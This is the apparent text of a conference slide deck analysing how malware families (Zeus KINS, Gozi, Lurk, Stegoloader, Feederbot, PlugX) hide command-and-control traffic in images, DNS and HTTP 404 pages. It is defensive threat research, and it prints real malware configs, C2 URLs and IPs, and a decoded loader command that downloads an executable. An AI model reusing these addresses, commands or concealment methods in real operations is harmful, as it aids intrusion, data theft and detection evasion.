Hiding in Plain Sight
Advances in Malware Covert Communication Channels
Pierre-Marc Bureau Christian Dietrich

Outline
1. Covert Channels 2. Steganography
a. Lurk b. Gozi c. Stegoloader
3. Inconspicuous Carrier Protocols
a. Feederbot b. PlugX c. Hiding in HTTP
4. Conclusions

Covert Channels and Malware -- Why?
 Receive commands from operator  Send feedback to operator  Receive updates and modules from operator  Exfiltrate data  Evade security
 Intrusion detection  Antivirus  Incident response  Forensics analysis
3

Definitions
Covert Channels Capability to transfer information between two hosts, which are not explicitly allowed to communicate. Steganography The practice of concealing messages or information within other non-secret text or data. Carrier Protocol The underlying protocol of the C2 protocol, e.g. HTTP.
4

Malware involving unique C2 Channels

Sophistication C2 Technique

+

HTTP, possibly encrypted

++

Email, Removable Drives

+++

Steganography, Covert Channel

Examples Today's average $botnet FANCY BEAR/APT28, Stuxnet In this talk

5

6

7

Zeus KINS (Not Steganography)

00000000 00000010 00000020 00000030 00000040 00000050 00000060 00000070 00000080 00000090 000000a0 000000b0 000000c0 000000d0

ff d8 ff e0 00 10 4a 46 01 2c 00 00 ff ed 31 ec 70 20 33 2e 30 00 38 42 00 10 01 2c 00 00 00 01 00 01 38 42 49 4d 04 04 5a 00 03 1b 25 47 1c 02 00 06 53 65 72 76 65 72 1c 02 19 00 0c 43 6c 6f 72 1c 02 19 00 08 43 6f 19 00 12 43 6f 6d 70 75 70 6d 65 6e 74 1c 02 19 65 72 20 4c 61 62 1c 02 74 65 72 20 4e 65 74 77 44 61 74 61 1c 02 19 00

49 46 00 01 01 01 01 2c 50 68 6f 74 6f 73 68 6f 49 4d 03 ed 00 00 00 00 00 01 01 2c 00 00 00 01 00 00 00 00 02 2c 1c 01 00 00 02 00 04 1c 02 05 1c 02 19 00 03 43 50 55 75 64 20 53 65 72 76 65 6d 70 75 74 65 72 1c 02 74 65 72 20 45 71 75 69 00 0c 43 6f 6d 70 75 74 19 00 10 43 6f 6d 70 75 6f 72 6b 1c 02 19 00 04 0b 44 61 74 61 20 4d 69

|......JFIF.....,| |.,....1.Photosho| |p 3.0.8BIM......| |...,.......,....| |..8BIM.......,..| |Z...%G..........| |..Server.....CPU| |.....Cloud Serve| |r.....Computer..| |...Computer Equi| |pment.....Comput| |er Lab.....Compu| |ter Network.....| |Data.....Data Mi|

8

Zeus KINS (Not Steganography)

00013790 000137a0 000137b0 000137c0 000137d0 000137e0 000137f0 00013800 00013810 00013820 00013830 00013840 00013850 00013860

cf 98 7d 54 83 45 57 8d 9f ff fe 3f 10 00 00 50 33 76 57 34 2f 55 41 44 59 69 6b 79 71 78 7a 6a 45 6a 2f 7a 35 53 4c 54 77 36 45 70 33 50 6b 72 66 61 64 31 67 76 71 59 38 6c 6e 54 7a 59 49 5a 54 5a 54 73 58 2f 42 30 78 4a 52 64 71 78 70 44 4d 37 57 61 39 57 55 76 74 30 58 44 4d 33 50 4a 63 4b 6e 6f 6e 2b 70 67 70 4f 2b 65 4b 6e 36 4a

89 6c 13 91 45 2e 61 f2 ff 70 b5 ec 03 00 00 37 64 4a 6a 4b 6d 62 2b 31 37 50 47 34 51 74 58 34 63 4e 65 5a 54 62 74 54 4b 57 6f 77 34 6a 6c 41 4c 4c 70 4f 54 65 46 43 4d 6d 4b 37 30 54 34 51 54 2f 69 4d 56 54 49 70 7a 76 50 33 48 48 66 39 49 41 74 46 78 5a 44 75 75 57 6f 75 36 57 35 45 72 35 6b 6a 64 41 62 67 44 77 33 6e 52 55 34 6b

|..}T.EW..l..E.a.| |...?...P.p.....7| |3vW4/UADdJjKmb+1| |Yikyqxzj7PG4QtX4| |Ej/z5SLTcNeZTbtT| |w6Ep3PkrKWow4jlA| |fad1gvqYLLpOTeFC| |8lnTzYIZMmK70T4Q| |TZTsX/B0T/iMVTIp| |xJRdqxpDzvP3HHf9| |M7Wa9WUvIAtFxZDu| |t0XDM3PJuWou6W5E| |cKnon+pgr5kjdAbg| |pO+eKn6JDw3nRU4k|

9

Zeus KINS (Not Steganography)

{{VERSION}} 2.0.0.0 {{VERSION}}

{{DROPZONE_URLS}} http://146.185.243.71/googleAD/cde.php {{END_DROPZONE_URLS}}

{{BINARY_URLS}} http://146.185.243.71/googleAD/update.exe {{END_BINARY_URLS}}
{{VNC_PLUGIN}} http://146.185.243.71/googleAD/mod_vnc.bin {{END_VNC_PLUGIN}}
{{MODULE}} http://146.185.243.71/googleAD/mod_spm.bin {{MODULE}}

{{WEBFILTERS}} !*.microsoft.com/* (monitor) !http://*myspace.com* (monitor) https://www.gruposantander.es/* !http://*odnoklassniki.ru/* (monitor) !http://vkontakte.ru/* (monitor) @*/login.osmp.ru/* (Monitor and screenshots) @*/atl.osmp.ru/* (Monitor and screenshots) $http://www.apple.com/mac/ $http://digg.com/news* {{END_WEBFILTERS}}

10

Gozi Neverquest

Gozi
 Appeared in 2007  Aliases: Vawtrak, Neverquest  Objectives: Banking fraud  Characteristics
 Process injection to change browser behavior  Password stealing  Remote access: VNC & SOCKS  Deletes browsing history to hide infection vector
12

Gozi C2 Channels

 HTTP POST  Linear Congruential Generator  aPlib compression
13

Gozi Covert Channels
 Steganography feature added beginning of 2015  Downloads information in favicon.ico
 SSL (https)  Tor (tor2web)
 Extracts information using LSB steganography  Decrypts information using RC4
14

Gozi's Steganography
https://6hts7b7onuh653ha.tor2web.org/favicon.ico
15

Gozi decoded information

00000000 00000010 00000020 00000030 00000040 00000050 00000060 00000070 00000080 00000090 000000a0 000000b0 000000c0 000000d0 000000e0 000000f0 00000100 00000110 00000120

76 f6 27 fd c2 df 95 f6 c2 f3 bd f2 8b 99 92 3a b8 17 8d 5d c8 e7 89 22 70 eb 13 a7 d2 d7 a2 6d a5 32 7f b4 2c 1e 12 3d 41 6a 30 26 df a3 63 ec 9d 6c 8c 7d 9f 41 65 18 d4 f3 ee 07 67 56 e8 e1 44 6e 75 76 61 74 6f 7a 65 62 61 6e 75 6b 2e 73 6f 2e 73 75 00 6d 65 69 6b 65 61 67 65 65 68 2e 2e 73 75 00 00 f2 12 00 15 e1 fb 76 23 73 a4 13 e0 5a ff 76 2c 00 00 00 c8 c7 7e 05 bc ec 9a 76 00 00 00 00 b1 02 00 00 28 c5 61 00 00 00 00 00 d0 f3 12 01 c4 f3 12 00

62 ba 1b 2c d6 8a 75 be 32 6d d7 92 30 6c 22 76 da cc d3 67 55 55 30 e7 d2 47 29 ca df f6 13 2e 3d 4a a3 4f 4a c7 3e 9a 52 4d 5d 6f a6 e3 be 27 85 eb 61 27 9c 20 5f 46 59 70 47 0f 7e 79 df 41 61 67 2e 73 75 00 78 65 75 00 70 75 78 69 6c 6f 63 6f 6f 67 2e 6b 7a 00 72 75 00 6c 61 62 65 61 28 c5 61 00 38 fb 12 00 fe ff ff ff d3 5d ff 76 38 00 00 00 ca c7 7e 05 5c 04 3b 01 04 01 00 00 00 00 00 00 00 f4 12 00 f8 b5 9a 76 14 04 76 00 58 00 00 00 00 00 00 00

|v.'.....b..,..u.| |.......:2m..0l"v| |...]..."...gUU0.| |p......m.G).....| |.2..,..==J.OJ.>.| |Aj0&..c.RM]o...'| |.l.}.Ae...a'. _F| |....gV..YpG.~y.A| |Dnuvatozag.su.xe| |ebanuk.su.puxilo| |o.su.meicoog.kz.| |keageeh.ru.labea| |.su.....(.a.8...| |...v#s.......].v| |.Z.v,...8.....~.| |..~....v\.;.....| |................| |(.a........v..v.| |........X.......|

16

Lurk

18

Lurk
 Downloader, used to install click fraud malware  Distributed through exploit kits  Hides download URLs in images using LSB steganography  String obfuscation and XOR encoding for payloads
19

More Lurk Steganography
20

Stegoloader

Stegoloader
22

Stegoloader
 Information stealer  "Downloader" module
 Spots analysis environment  Downloads image from legitimate websites  Extracts main module code from image  Launch main module code
 Creates a verbose profile of infected hosts  Downloads modules, depending on host profiles
23

Stegoloader - Infection
 Websites pretending to deliver key generators are used to distribute the malware
 New variants appear almost on a daily basis
24

Stegoloader Image Processing
PNG Image LSB extraction RC4 decryption
Code

push mov sub push push push ...

ebp ebp, esp esp, 24h esi edi 14h

25

26

Stegoloader - Software Protection  Resolve "funky" imports  GetCursorPos()  Dynamic construction of strings  List running processes
27

Stegoloader Debug Reporting
55 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_39_page_ok 56 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_40_image_size_ok 57 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_41_image_type_ok 58 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_42_gdiplus_ok 59 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_43_image_ok 60 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_44_crc_ok 61 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_45_payload_ok 62 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_46_payload_size_ok 63 404 HTTP innonation.com.hk \\
/report_N_0024_405A197B534CD001-_47_payload_type_shell 64 404 HTTP innonation.com.hk /report_N_0024_405A197B534CD001-_48_payload_mem_ok
28

Stegoloader Module Interaction
Deployment Module

Main Module

Geolocation Module
Recent Documents Module
Password Stealer

IDA License Stealer

Distraction (?) Payload

Monetization Payload

29

Stegoloader Network Communications  HTTP POST  RC4 Encryption  Base64 Encoding  LZMA Compression
30

Stegoloader "scenarios"
-> 0x00 <- 0x03 SysInfos -> 0x03 {"data": {"OsID": <- 0xdc WindowsTimeStamp -> 0xdc {"WindowsTimeStamp": " <- 0xdd WindowsInstallTimeStamp -> 0xdd {"WindowsInstallerTimeStamp": " <- 0xde WindowsPrefetchTimeStamp -> 0xde {"WindowsPrefetchTimeStamp": <- 0xdf SwapTimeStamp? -> 0xdf {} <- 0xe0 Unknown/Noop -> 0xe0 {} <- 0x64 Geoloc shellcode -> 0x64 Geoloc result <- 0x04 GetInstalledSoftware -> 0x04 {"Software": "<base64>"... <- 0x05 Browsing history -> 0x05 empty <- 0x06 Browsing history -> 0x06 empty <- 0xd2 GetSoftwareKeys -> 0xd2 {"SoftwareKeysSystem": " <- 0x64 Pony infostealer, size 38439 -> 0x64 <- 0x64 List recently opened documents, size 7344 -> 0x64 <- 0x01 Kill bot -> 0x01 OK, killed
31

32

Summary

Malware

Stego File

Compression

algo

type

Gozi

LSB

Lurk

LSB

Stegoloader LSB

ico bmp png

None None None

Crypto
RC4 Custom RC4

Compression

Encryption

Steganography
33

Covert Communication Channels

DNS
;QUESTION newcommunitybank.com. IN A ;ANSWER newcommunitybank.com. 86400 IN A 74.54.82.153
;QUESTION 1.f16e180e9093c237ea31a4ab55ae7fac710a14e4972b30fdf4.google.com. IN ANY ;ANSWER 1.f16e180e9093c237ea31a4ab55ae7fac710a14e4972b30fdf4.google.com. 0 IN TXT "aYpYOb/6L5NRMxDRbwQDrVfPJDw5yogih+zlfj+lQpRDPZE4n1DWB0M/l0J6YDp88Vgm"
35

Why DNS for C2?
 No specific detection for the DNS protocol
 Existing DNS-based protection means target domain names resolved via DNS, but rarely DNS traffic in general
 (Syntactically valid) DNS with third-party resolvers often allowed
 Often unfiltered
 Even in firewalled environments, DNS often allowed and unfiltered
 Designed as a distributed system
 Provides advantages to the malware operator

36
Grandjean, Martin (2014). "La connaissance est un réseau"

Feederbot - A botnet with DNS C2
 Initially discovered in 2010  Named Feederbot based on a characteristic string
"feedme" in the binary  Performs ad/click fraud
 Implements a covert channel via DNS  Several query domain schemes  Well-known registered domains and unregistered domains  Distributed infrastructure, spread over multiple
Autonomous Systems
37

Feederbot DNS C2
;QUESTION 1.f16e180e9093c237ea31a4ab55ae7fac710a14e4972b30fdf4.google.com. IN ANY
;ANSWER 1.f16e180e9093c237ea31a4ab55ae7fac710a14e4972b30fdf4.google.com. 0 IN TXT "aYpYOb/6L5NRMxDRbwQDrVfPJDw5yogih+zlfj+lQpRDPZE4n1DWB0M/l0J6YDp88Vgm"

 50-char system-dependent bot ID:

f16e180e9093c237ea31a4ab55ae7fac710a14e4972b30fdf4

 RC4-encrypted bootstrap traffic

0000 8E 68 00 00 0B 00 00 00 17 00 00 00 39 34 2E 32 .h..........94.2

0010 33 2E 36 2E 36 37 00 69 6D 61 67 65 73 2E 6D 6F 3.6.67.images.mo

0020 76 69 65 64 79 65 61 72 2E 6E 65 74 2E 00 3C

viedyear.net..<

 Contains a referral to the next C2 server node 94.23.6.67

38

Feederbot DNS C2 referral

0000 0010 0020

8E 68 00 00 0B 00 00 00 17 00 00 00 39 34 2E 32 33 2E 36 2E 36 37 00 69 6D 61 67 65 73 2E 6D 6F 76 69 65 64 79 65 61 72 2E 6E 65 74 2E 00 3C

.h..........94.2 3.6.67.images.mo viedyear.net..<

 Basically a referral to a subsequent C2 server node 94.23.6.67  First DWORD is a magic value used to query subsequent C2 nodes:
0x688e (26766)
 Second DWORD is the length of the next C2 server string (0xB, 11 chars)  Third DWORD is the length of the domain for subsequent C2 queries (0x17,
23 chars)  Subsequent C2:
;QUESTION 0.26766.images.moviedyear.net. IN TXT
39

Feederbot C&C message structure  Inside the rdata field of a DNS response carrying a TXT resource record  Maximum length of 220 bytes per message (chunking)  Lots of different RC4 keys
40

message

PlugX

OPERATIONAL WINDOW
Multiple years
ARCHITECTURE

TARGETING
Government Defense Aerospace Pro-Democracy

Modular, Plugin-Based Multiple C2 Carrier Protocols

TOOLS
PlugX
41

PlugX DNS C2

;QUESTION

CCCCCCOBOPNMMDLBINCDMIGOAEKJEPOEIKCAMFGLPAKGEMOBIHCNLCFIPNJDDJN.

OHEBKKPEFOKIACGMLGBPGJMDCNHHNBDLIFOPDJJDPNEGKAAKFELOAIGCMMBGHAN.

KCEINNHDBJLOFEPJJP.bad.domain.com

IN

TXT

 DNS C2 channel (XSoDNS)  Base16 encoding with custom alphabet  Randomness in the first few bytes for each
request  Byte at offset 3 is always 0x1e (decimal 30)  In the encoded query domain: `OB' at offset 6

"The length of any one label is limited to between 1 and 63 octets. A full domain name is limited to 255 octets (including the separators)."
RFC2181
42

Hiding commands in HTTP error messages
HTTP/1.1 404 Not Found Date: Mon, 9 Jul 2015 06:13:37 GMT Server: Apache/2 X-Powered-By: PHP/5.3.29 Vary: Accept-Encoding,User-Agent Content-Length: 357 Connection: close Content-Type: text/html; charset=utf8
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL /XXX/YYY.php was not found on this server.<P><HR><ADDRESS></ADDRESS></BODY></HTML><!-- DEBUG: MTQyODUyMTUyMzcyOTk5MyNsb2FkZXIgaHR0cDovLzExMS4xNzkuMzkuODMvZ29sZGVuMy5leGUjMTQyOD UxMjA2MTc1NDYzNSNyYXRlIDYwIwDEBUG-->
43

Hiding commands in HTTP error messages
HTTP/1.1 404 Not Found Date: Mon, 9 Jul 2015 06:13:37 GMT Server: Apache/2 X-Powered-By: PHP/5.3.29 Vary: Accept-Encoding,User-Agent Content-Length: 357 Connection: close Content-Type: text/html; charset=utf8
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not Found</H1>The requested URL /XXX/YYY.php was not found on this server.<P><HR><ADDRESS></ADDRESS></BODY></HTML><!-- DEBUG: MTQyODUyMTUyMzcyOTk5MyNsb2FkZXIgaHR0cDovLzExMS4xNzkuMzkuODMvZ29sZGVuMy5leGUjMTQyOD UxMjA2MTc1NDYzNSNyYXRlIDYwIwDEBUG-->
1428521523729993#loader http://111.179.39.83/golden3.exe#1428512061754635#rate 60#
44

Conclusions

Hidden Communication Requirements
 Type of infrastructure
 Compromised  Legitimate
 Content to hide
 Size  Sensitivity
 Other technologies
 Cryptography  Compression
46

Conclusions
Using inconspicuous carrier protocols provides stealth currently being used
 In targeted attacks  In "commodity" cyber crime
If done right, covert channels are efficient for malware operators
 Intrusion Detection Systems  Antivirus Products  Analysts and researchers
47

Conclusions (cont'd)
 Steganography works if used with crypto to transmit small messages  Unidirectional communication at this point  Protocols that consume bandwidth might serve better to encode
significant amounts of information
48

Thank you!

Special thanks to: Tillmann Werner Brett Stone-Gross Pallav Khandar Jesse Gabriel

 Hidden communication channels are currently being used in all kinds of malware including information stealers, RATs, DDoS tools and malware downloaders
 Cyber criminals and nation state actors hide malicious communication using steganography and inconspicuous carrier protocols
 Hidden communication channels are designed to be hard to identify, both for researchers and automated tools

References
 https://blog.malwarebytes.org/security-threat/2014/02/hiding-in-plain-sight-a-story-about-a-sneaky-bankingtrojan/
 http://www.secureworks.com/cyber-threat-intelligence/threats/malware-analysis-of-the-lurk-downloader/  https://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/sophos-vawtrak-international-
crimeware-as-a-service-tpna.pdf  http://blog.crowdstrike.com/storm-chasing/  http://www.secureworks.com/cyber-threat-intelligence/threats/stegoloader-a-stealthy-information-stealer/  http://www.cj2s.de/On-Botnets-that-use-DNS-for-Command-and-Control.pdf  https://blog.fortinet.com/post/hiding-malicious-traffic-under-the-http-404-error  http://www.crowdstrike.com/global-threat-report-2014/

